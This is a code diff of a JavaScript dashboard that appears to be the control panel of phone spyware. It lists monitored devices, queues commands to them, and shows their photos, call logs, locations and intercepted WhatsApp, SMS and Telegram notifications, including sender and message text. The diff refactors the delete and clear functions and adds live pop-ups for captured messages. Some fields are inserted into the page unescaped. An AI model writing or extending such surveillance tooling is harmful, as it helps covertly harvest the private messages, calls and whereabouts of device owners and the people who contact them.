-// ===== DELETE FUNCTIONS =====
-async function deletePhoto(photoId) {
-  showConfirm('Delete Photo', 'Are you sure you want to delete this photo?', async () => {
-    try { await fetch(`${API_BASE}/api/photos/${photoId}`, { method: 'DELETE' }); showToast('Photo deleted'); refreshPhotos(); if (selectedDevice) loadDevicePhotos(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-async function deleteCallLog(logId) {
-  showConfirm('Delete Call Log', 'Delete this call log entry?', async () => {
-    try { await fetch(`${API_BASE}/api/calllogs/${logId}`, { method: 'DELETE' }); showToast('Call log deleted'); refreshCallLogs(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-async function deleteDevicePhotos() {
-  if (!selectedDevice) return;
-  showConfirm('Delete All Device Photos', 'Delete all photos from this device?', async () => {
-    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); showToast('All device photos deleted'); loadDevicePhotos(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-async function deleteDeviceCallLogs() {
-  if (!selectedDevice) return;
-  showConfirm('Delete All Device Call Logs', 'Delete all call logs from this device?', async () => {
-    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); showToast('All call logs deleted'); loadCommandHistory(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-async function deleteDeviceLocations() {
-  if (!selectedDevice) return;
-  showConfirm('Delete All Locations', 'Delete all location data from this device?', async () => {
-    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); showToast('All locations deleted'); document.getElementById('deviceLocations').innerHTML = '<div class="empty-state">No location data.</div>'; document.getElementById('locationInfo').classList.add('hidden'); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-async function deleteAllDeviceData() {
-  if (!selectedDevice) return;
-  showConfirm('Delete All Device Data', 'This will delete ALL photos, call logs, locations, notifications, and commands for this device. Continue?', async () => {
-    try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('All device data deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-async function deleteDevice() {
-  if (!selectedDevice) return;
-  showConfirm('Delete Device', 'This will permanently delete the device and ALL its data. Continue?', async () => {
-    try { await fetch(`${API_BASE}/api/device/${selectedDevice}`, { method: 'DELETE' }); showToast('Device deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-
-async function clearAllCommands() {
-  showConfirm('Clear All Commands', 'Delete ALL commands for ALL devices?', async () => {
-    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/commands`, { method: 'DELETE' }); } showToast('All commands cleared'); refreshAllCommands(); refreshStats(); } catch (e) { showToast('Clear failed', true); }
-  });
-}
-async function clearAllCallLogs() {
-  showConfirm('Clear All Call Logs', 'Delete ALL call logs for ALL devices?', async () => {
-    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/calllogs`, { method: 'DELETE' }); } showToast('All call logs cleared'); refreshCallLogs(); refreshStats(); } catch (e) { showToast('Clear failed', true); }
-  });
-}
-async function clearAllPhotos() {
-  showConfirm('Delete All Photos', 'Delete ALL photos from ALL devices? This removes files from storage too.', async () => {
-    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/photos`, { method: 'DELETE' }); } showToast('All photos deleted'); refreshPhotos(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
-async function nukeAllData() {
-  showConfirm('DELETE EVERYTHING', 'This will permanently delete ALL devices, photos, call logs, locations, and commands. This cannot be undone!', async () => {
-    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}`, { method: 'DELETE' }); } showToast('All data deleted'); refreshDevices(); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-  });
-}
+// ===== DELETE =====
+async function deletePhoto(id) { showConfirm('Delete Photo', '', async () => { try { await fetch(`${API_BASE}/api/photos/${id}`, { method: 'DELETE' }); showToast('Deleted'); refreshPhotos(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function deleteCallLog(id) { showConfirm('Delete Call Log', '', async () => { try { await fetch(`${API_BASE}/api/calllogs/${id}`, { method: 'DELETE' }); refreshCallLogs(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function deleteDevicePhotos() { if (!selectedDevice) return; showConfirm('Delete All Photos', '', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); showToast('Deleted'); loadDevicePhotos(selectedDevice); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function deleteDeviceCallLogs() { if (!selectedDevice) return; showConfirm('Delete All Call Logs', '', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); showToast('Deleted'); loadCommandHistory(selectedDevice); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function deleteDeviceLocations() { if (!selectedDevice) return; showConfirm('Delete All Locations', '', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); showToast('Deleted'); document.getElementById('deviceLocations').innerHTML = ''; document.getElementById('locationInfo').classList.add('hidden'); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function deleteAllDeviceData() { if (!selectedDevice) return; showConfirm('Delete All Data', 'All photos, call logs, locations, notifications, commands for this device.', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' }); await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('Deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function deleteDevice() { if (!selectedDevice) return; showConfirm('Delete Device', 'Permanently delete this device and all its data.', async () => { try { await fetch(`${API_BASE}/api/device/${selectedDevice}`, { method: 'DELETE' }); showToast('Deleted'); showDeviceList(); refreshDevices(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function clearAllCommands() { showConfirm('Clear Commands', 'Delete all commands?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/commands`, { method: 'DELETE' }); showToast('Cleared'); refreshAllCommands(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function clearAllCallLogs() { showConfirm('Clear Call Logs', 'Delete all call logs?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/calllogs`, { method: 'DELETE' }); showToast('Cleared'); refreshCallLogs(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function clearAllPhotos() { showConfirm('Delete All Photos', 'Delete all photos from storage?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/photos`, { method: 'DELETE' }); showToast('Deleted'); refreshPhotos(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
+async function nukeAllData() { showConfirm('DELETE EVERYTHING', 'This permanently deletes ALL data. Cannot be undone!', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}`, { method: 'DELETE' }); showToast('All data deleted'); refreshDevices(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
 
 // ===== Notifications =====
 function handleLiveNotification(msg) {
   showToast(`${msg.app_name || ''} - ${msg.sender || ''}: ${(msg.message || '').substring(0, 80)}`);
   showNotifToast(msg);
   if (document.getElementById('sec-notifications')?.classList.contains('active')) refreshNotifications();
+  animateCounter(document.getElementById('statNotifs'), parseInt(document.getElementById('statNotifs').textContent) + 1);
+}
+
+function showNotifToast(msg) {
+  const container = document.getElementById('notifToastContainer');
+  const card = document.createElement('div');
+  card.className = 'notif-toast-card';
+  const badgeClass = getNotifBadgeClass(msg.app_name || msg.app_package);
+  const icon = msg.app_name?.toLowerCase().includes('whatsapp') ? '&#128172;' :
+               msg.app_name?.toLowerCase().includes('message') || msg.app_name?.toLowerCase().includes('sms') ? '&#128231;' : '&#128172;';
+  card.innerHTML = `<div class="notif-toast-icon ${badgeClass}" style="font-size:16px">${icon}</div>
+    <div class="notif-toast-body">
+      <div class="notif-toast-header"><span class="notif-toast-app">${escapeHtml(msg.app_name || 'App')}</span><button class="notif-toast-close" onclick="this.parentElement.parentElement.parentElement.remove()">&times;</button></div>
+      <div class="notif-toast-sender">${escapeHtml(msg.sender || '')}</div>
+      <div class="notif-toast-text">${escapeHtml((msg.message || '').substring(0, 120))}</div>
+    </div>`;
+  container.appendChild(card);
+  setTimeout(() => { card.classList.add('removing'); setTimeout(() => card.remove(), 300); }, 6000);
 }
 
 async function refreshNotifications() {
   const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
-  let allNotifs = [];
+  let all = [];
   for (const d of devices) {
-    const notifs = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json());
-    allNotifs.push(...notifs.map(n => ({ ...n, device_name: d.device_name || d.id.substring(0, 12) })));
+    const n = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json());
+    all.push(...n.map(x => ({ ...x, device_name: d.device_name || d.id.substring(0, 12) })));
   }
-  allNotifs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
+  all.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
   const container = document.getElementById('notifList');
-  if (allNotifs.length === 0) {
-    container.innerHTML = '<div class="empty-state">No notifications captured yet. Enable Notification Access on the device.</div>';
-    return;
-  }
-  container.innerHTML = `
-    <table>
-      <thead><tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Time</th><th></th></tr></thead>
-      <tbody>
-        ${allNotifs.slice(0, 200).map(n => {
-          const badgeClass = getNotifBadgeClass(n.app_name || n.app_package);
-          return `<tr>
-            <td>${n.device_name}</td>
-            <td><span class="notif-app-badge ${badgeClass}">${n.app_name || n.app_package}</span></td>
-            <td>${n.sender || '-'}</td>
-            <td><div class="notif-message">${escapeHtml(n.message || '')}</div></td>
-            <td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
-            <td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td>
-          </tr>`;
-        }).join('')}
-      </tbody>
-    </table>
-  `;
+  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No notifications yet. Enable Notification Access on device.</div>'; return; }
+  container.innerHTML = `<table><thead><tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Time</th><th></th></tr></thead><tbody>
+    ${all.slice(0, 200).map(n => {
+      const cls = getNotifBadgeClass(n.app_name || n.app_package);
+      return `<tr><td>${n.device_name}</td><td><span class="notif-app-badge ${cls}">${n.app_name || n.app_package}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td><td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td></tr>`;
+    }).join('')}
+  </tbody></table>`;
 }
 
-function getNotifBadgeClass(appName) {
-  if (!appName) return '';
-  const lower = appName.toLowerCase();
-  if (lower.includes('whatsapp')) return 'whatsapp';
-  if (lower.includes('message') || lower.includes('sms') || lower.includes('mms')) return 'sms';
-  if (lower.includes('telegram')) return 'telegram';
+function getNotifBadgeClass(name) {
+  if (!name) return '';
+  const l = name.toLowerCase();
+  if (l.includes('whatsapp')) return 'whatsapp';
+  if (l.includes('message') || l.includes('sms') || l.includes('mms')) return 'sms';
+  if (l.includes('telegram')) return 'telegram';
   return '';
 }
+function escapeHtml(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
+async function deleteNotification(id) { try { await fetch(`${API_BASE}/api/notifications/${id}`, { method: 'DELETE' }); refreshNotifications(); } catch (_) { showToast('Failed', true); } }
+async function clearAllNotifications() { showConfirm('Clear All Notifications', 'Delete all notifications for all devices?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/notifications`, { method: 'DELETE' }); showToast('Cleared'); refreshNotifications(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }
 
-function escapeHtml(text) {
-  const div = document.createElement('div');
-  div.textContent = text;
-  return div.innerHTML;
-}
-
-async function deleteNotification(notifId) {
-  try { await fetch(`${API_BASE}/api/notifications/${notifId}`, { method: 'DELETE' }); refreshNotifications(); } catch (e) { showToast('Delete failed', true); }
-}
-
-async function clearAllNotifications() {
-  showConfirm('Clear All Notifications', 'Delete all captured notifications for ALL devices?', async () => {
-    try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) { await fetch(`${API_BASE}/api/device/${d.id}/notifications`, { method: 'DELETE' }); } showToast('All notifications cleared'); refreshNotifications(); refreshStats(); } catch (e) { showToast('Clear failed', true); }
-  });
-}
-
-// ===== Device Notifications (detail) =====
 async function loadDeviceNotifications(deviceId) {
   try {
     const res = await fetch(`${API_BASE}/api/device/${deviceId}/notifications`);
     const notifs = await res.json();
     const container = document.getElementById('deviceNotifications');
-    if (notifs.length === 0) {
-      container.innerHTML = '<div class="empty-state">No notifications captured.</div>';
-      return;
-    }
-    container.innerHTML = `
-      <table>
-        <thead><tr><th>App</th><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
-        <tbody>
-          ${notifs.slice(0, 50).map(n => {
-            const badgeClass = getNotifBadgeClass(n.app_name || n.app_package);
-            return `<tr>
-              <td><span class="notif-app-badge ${badgeClass}">${n.app_name || n.app_package}</span></td>
-              <td>${n.sender || '-'}</td>
-              <td><div class="notif-message">${escapeHtml(n.message || '')}</div></td>
-              <td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
-            </tr>`;
-          }).join('')}
-        </tbody>
-      </table>
-    `;
-  } catch (e) {
-    console.error('Failed to load notifications:', e);
-  }
+    if (notifs.length === 0) { container.innerHTML = '<div class="empty-state">No notifications</div>'; return; }
+    container.innerHTML = `<table><thead><tr><th>App</th><th>Sender</th><th>Message</th><th>Time</th></tr></thead><tbody>
+      ${notifs.slice(0, 50).map(n => {
+        const cls = getNotifBadgeClass(n.app_name || n.app_package);
+        return `<tr><td><span class="notif-app-badge ${cls}">${n.app_name || n.app_package}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td></tr>`;
+      }).join('')}
+    </tbody></table>`;
+  } catch (_) {}
 }
-
-async function deleteDeviceNotifications() {
-  if (!selectedDevice) return;
-  try { await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('Notifications cleared'); loadDeviceNotifications(selectedDevice); refreshStats(); } catch (e) { showToast('Delete failed', true); }
-}
+async function deleteDeviceNotifications() { if (!selectedDevice) return; try { await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('Cleared'); loadDeviceNotifications(selectedDevice); refreshStats(); } catch (_) { showToast('Failed', true); } }
 
 // ===== Toast =====
 function showToast(message, isError = false) {
